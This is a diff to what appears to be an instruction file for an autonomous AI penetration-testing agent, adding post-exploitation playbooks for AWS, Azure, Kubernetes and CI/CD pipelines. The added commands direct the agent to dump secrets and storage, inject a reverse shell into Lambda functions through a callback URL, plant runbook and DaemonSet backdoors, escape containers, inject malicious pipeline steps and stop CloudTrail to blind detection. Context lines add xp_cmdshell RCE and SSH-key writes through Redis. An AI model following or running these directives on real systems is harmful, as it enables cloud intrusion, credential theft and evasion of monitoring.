@@ -133,6 +133,52 @@ After gaining access on a macOS target, deploy tools for credential harvesting a
 - `machook cleanup_mac` — ALWAYS run before exiting to remove LaunchAgents and clear logs
 - Skills: `skill search --tech macos,postexploit,keychain`
 
+**AWS post-exploitation (after compromising IAM credentials or EC2 instance):**
+After compromising AWS credentials, deploy cloud-native tools for privilege escalation, data exfiltration, and persistence.
+- `awshook iam_enum` — enumerate IAM users, roles, policies, and find privilege escalation paths
+- `awshook iam_privesc --method passrole` — exploit IAM misconfigs via PassRole/AssumeRole/Lambda chains
+- `awshook s3_dump` — list all buckets, identify and download sensitive files (.env, backups, credentials)
+- `awshook lambda_backdoor --function-name NAME --callback-url URL` — inject reverse shell into existing Lambda
+- `awshook ssm_exec --instance-id ID --command CMD` — execute commands on EC2 via SSM without SSH
+- `awshook metadata_harvest` — extract IAM role credentials from EC2/ECS/Lambda metadata endpoints
+- `awshook cloudtrail_blind --action stop` — stop CloudTrail to blind detection
+- `awshook secrets_dump` — extract all secrets from Secrets Manager and SSM Parameter Store
+- `awshook ec2_snapshot --volume-id VOL_ID` — snapshot EBS volumes for cross-account data access
+- `awshook cleanup_aws` — ALWAYS run before exiting to remove created resources and restore CloudTrail
+- Skills: `skill search --tech aws,iam,cloud,postexploit`
+
+**Azure post-exploitation (after compromising Azure credentials or managed identity):**
+After compromising Azure/Entra ID credentials, deploy tools for tenant enumeration, privilege escalation, and data extraction.
+- `azurehook entra_enum` — enumerate Entra ID users, groups, app registrations, service principals
+- `azurehook entra_privesc --method consent_grant` — app consent grant, Global Admin path, PIM abuse
+- `azurehook keyvault_dump` — extract secrets, keys, certificates from all accessible Key Vaults
+- `azurehook storage_dump` — download sensitive data from Blob/Table/Queue storage
+- `azurehook managed_identity` — extract managed identity tokens from VM/App Service/Functions
+- `azurehook runbook_backdoor --automation-account NAME --resource-group RG` — inject backdoor into Automation runbook
+- `azurehook azuread_token --action refresh` — refresh token manipulation, scope expansion, PRT abuse
+- `azurehook cleanup_azure` — ALWAYS run before exiting to remove created resources
+- Skills: `skill search --tech azure,entraid,cloud,postexploit`
+
+**Kubernetes post-exploitation (after compromising pod or kubeconfig):**
+After compromising a Kubernetes pod or obtaining kubeconfig, deploy tools for cluster enumeration, secret extraction, and container escape.
+- `kubehook k8s_enum` — enumerate namespaces, pods, services, secrets, RBAC, ingress
+- `kubehook k8s_secrets` — extract Kubernetes Secrets from all accessible namespaces
+- `kubehook k8s_escape` — container escape via privileged mode, hostPID, mounted docker socket
+- `kubehook k8s_privesc --method bind_admin` — ServiceAccount token theft, RBAC abuse, ClusterRoleBinding
+- `kubehook etcd_dump --endpoint ENDPOINT` — direct etcd connection to extract all secrets
+- `kubehook k8s_backdoor --type daemonset --image IMAGE` — deploy DaemonSet/CronJob backdoor pod
+- `kubehook cleanup_k8s` — ALWAYS run before exiting to remove all created Kubernetes resources
+- Skills: `skill search --tech kubernetes,container,rbac,postexploit`
+
+**CI/CD pipeline attacks (after compromising CI/CD access):**
+After gaining access to CI/CD systems, extract secrets and inject malicious pipeline steps.
+- `cipipe gh_secrets --repo OWNER/REPO` — extract GitHub Actions secrets via workflow injection
+- `cipipe jenkins_creds --url JENKINS_URL` — dump Jenkins credentials (credentials.xml, script console)
+- `cipipe pipeline_inject --repo OWNER/REPO --callback-url URL` — inject malicious steps into CI/CD pipeline
+- `cipipe gitlab_tokens --url GITLAB_URL --project-id ID` — extract GitLab CI/CD variables and runner tokens
+- `cipipe cleanup_ci` — ALWAYS run to remove injected pipeline modifications
+- Skills: `skill search --tech cicd,github-actions,jenkins,gitlab,pipeline`
+
 **Internal services:**
 - MSSQL: `netexec mssql <range>` → default creds → xp_cmdshell for RCE
 - Redis: `redis-cli -h <target>` → unauthenticated → write SSH key or cron
@@ -186,3 +232,7 @@ For every confirmed finding, call `report_vulnerability`:
 | ebpf | eBPF kernel-level post-exploitation — credential capture, process/file/connection hiding, traffic interception (root + Linux) |
 | winhook | Windows userland post-exploitation — LSASS/SAM dump, DPAPI decrypt, keylogging, AMSI/ETW bypass, clipboard sniffing (Administrator + Windows) |
 | machook | macOS post-exploitation — Keychain dump, browser creds, DTrace monitoring, TCC bypass, XProtect enumeration (root + macOS) |
+| awshook | AWS post-exploitation — IAM privesc, S3 dump, Lambda backdoor, SSM exec, CloudTrail manipulation, secrets extraction (AWS credentials required) |
+| azurehook | Azure/Entra ID post-exploitation — Key Vault dump, managed identity harvest, runbook backdoor, consent grants, token abuse (Azure credentials required) |
+| kubehook | Kubernetes post-exploitation — secret extraction, container escape, RBAC abuse, etcd dump, DaemonSet/CronJob backdoor (kubeconfig required) |
+| cipipe | CI/CD pipeline attacks — GitHub Actions/Jenkins/GitLab secret extraction, pipeline injection (API token required) |
